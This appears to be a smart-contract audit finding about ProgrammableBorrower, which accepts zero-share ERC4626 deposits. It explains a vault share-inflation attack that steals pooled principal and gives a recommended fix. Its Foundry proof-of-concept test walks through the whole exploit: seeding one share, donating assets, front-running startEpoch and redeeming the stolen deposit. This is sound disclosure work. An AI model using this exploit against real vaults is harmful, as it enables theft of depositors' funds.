### Title
ProgrammableBorrower accepts zero-share ERC4626 deposits, allowing vault-share inflation to steal pooled principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower._depositToVault` deposits underlying into the configured ERC4626 vault but does not validate that the returned share amount is nonzero or economically equivalent to the deposited assets. An attacker who is an ordinary vault depositor can seed an empty/small vault, directly donate underlying to inflate its share price, and cause the borrower’s next epoch-start deposit to mint zero shares while still transferring the underlying into the vault. This breaks the solvency and fair vault-mint invariants: the attacker controls the only vault shares and can redeem both the donation and the borrower’s deposit.

### Finding Description

During `IdleCDOEpochVariant.startEpoch`, funds sent to the programmable borrower trigger `onStartEpoch`, which snapshots the borrower’s pre-deposit assets and then deposits its entire token balance into the configured ERC4626 vault. [1](#0-0)  The deposit helper accepts the returned share count without checking `shares`, `previewDeposit`, or the post-deposit value represented by those shares. [2](#0-1) 

For a vulnerable ERC4626 implementation using a calculation equivalent to `assets * totalSupply / assetsBefore`, a direct underlying donation raises `assetsBefore` before the borrower deposit executes. If the attacker owns one vault share and makes `assetsBefore` greater than the borrower’s deposit, integer division returns zero shares while the vault still receives the borrower’s assets. Because the attacker owns the entire share supply, they can redeem the donation plus the stolen deposit.

### Impact Explanation

An unprivileged ERC4626 vault user can steal up to the full amount parked by `ProgrammableBorrower` at epoch start. For example, with a 10,000 USDC pool deposit, the attacker seeds one share and donates 20,000 USDC; the borrower’s deposit mints zero shares, while the attacker’s one share becomes redeemable for approximately 30,000 USDC, yielding a net profit of approximately the borrower’s 10,000 USDC deposit.

This is not merely a pricing inaccuracy: `vault.balanceOf(address(this))` remains zero, so `_currentVaultAssets` excludes the deposited principal from `availableToBorrow`, `totalInterestDueNow`, and epoch settlement. [3](#0-2) 

### Likelihood Explanation

The attack requires the configured ERC4626 vault to permit direct-asset inflation and permit a deposit that mints zero shares. The borrower does not enforce these properties itself, even though it deposits an unbounded amount without a minimum-share or value check. [2](#0-1)  Honest owner or manager transaction ordering makes the issue exploitable by front-running or sandwiching the privileged `startEpoch` call; the attacker does not need any privileged role.

Existing guards do not prevent it because `_depositToVault` treats every successful `vault.deposit` call as valid, `epochStartVaultAssets` intentionally excludes the deposit from `epochDepositedToVault`, and `setVault` only checks the vault asset and current borrower share balance. [4](#0-3) 

### Recommendation

Apply a minimum-share/value invariant to every external vault deposit:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
if (expectedShares == 0) revert InvalidAmount();

uint256 sharesBefore = vault.balanceOf(address(this));
uint256 shares = vault.deposit(_assetAmount, address(this));

if (shares == 0 || vault.convertToAssets(shares) < _assetAmount) {
    revert InvalidAmount();
}
```

A bounded tolerance can replace strict equality where the vault legitimately charges deposit fees. At minimum, revert on `shares == 0`; stronger protection should compare the value of newly minted shares against the deposited assets and only integrate vaults that implement virtual shares or another donation-resistant share mechanism.

### Proof of Concept

The existing test mock has the required vulnerable conversion: it calculates shares as `assets * supply / assetsBefore`, where `assetsBefore` includes direct token donations. [5](#0-4) 

```solidity
// test/foundry/ProgrammableBorrowerCreditVault.t.sol
function testPocVaultShareInflationStealsEpochDeposit() external {
    MockStopEpochLiquidityVault vulnerableVault =
        new MockStopEpochLiquidityVault(USDC);

    // Uses the repository's existing mainnet-forked CDO/programmable-borrower setup.
    _setUpProgrammableBorrowerCreditVault(
        FORK_BLOCK,
        address(vulnerableVault)
    );

    address attacker = makeAddr("vaultShareInflationAttacker");
    uint256 poolDeposit = 10_000 * oneScale;
    uint256 attackerDonation = 20_000 * oneScale;

    // Attacker seeds one share and inflates assetsBefore through a raw transfer.
    deal(USDC, attacker, attackerDonation + 1, true);
    vm.startPrank(attacker);
    underlying.approve(address(vulnerableVault), type(uint256).max);
    vulnerableVault.deposit(1, attacker);
    underlying.transfer(address(vulnerableVault), attackerDonation);
    vm.stopPrank();

    // KYC-passing lender deposits into the credit vault during the buffer.
    idleCDO.depositAA(poolDeposit);

    // Honest manager starts the epoch. startEpoch transfers the pool balance to
    // ProgrammableBorrower, whose onStartEpoch calls vault.deposit.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // Vulnerable vault math:
    // shares = poolDeposit * 1 / (attackerDonation + 1) = 0.
    assertEq(
        vulnerableVault.balanceOf(address(programmableBorrower)),
        0,
        "borrower received shares"
    );
    assertEq(
        programmableBorrower.vaultSharesBalance(),
        0,
        "borrower vault position missing"
    );

    // The attacker's sole share redeems donation plus the borrower's deposit.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 recovered =
        vulnerableVault.redeem(1, attacker, attacker);

    assertEq(
        recovered,
        attackerDonation + poolDeposit + 1,
        "attacker did not recover inflated vault assets"
    );
    assertGt(
        underlying.balanceOf(attacker) - attackerBefore,
        attackerDonation,
        "pool deposit was not stolen"
    );
}
```
